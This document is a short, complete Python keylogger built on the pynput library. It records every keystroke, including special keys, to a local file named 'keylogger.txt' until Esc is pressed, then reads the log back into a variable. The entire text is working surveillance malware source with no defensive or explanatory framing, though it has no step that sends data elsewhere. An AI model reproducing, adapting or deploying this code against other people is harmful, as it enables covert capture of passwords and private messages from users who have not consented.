from pynput import keyboard

message = ""


def write(text):
    with open("keylogger.txt", 'a') as f1:
        f1.write(text)
        f1.close()


def on_key_press(key):
    try:
        if key == keyboard.Key.enter:
            write("\n")
        else:
            write(key.char)
    except AttributeError:
        if key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif key == keyboard.Key.tab:
            write("\nTab Pressed\n")
        elif key == keyboard.Key.space:
            write(" ")
        else:
            temp = repr(key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(key))


def on_key_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

with open("keylogger.txt", 'r') as f:
    temp1 = f.read()
    message = message + str(temp1)
    f.close()
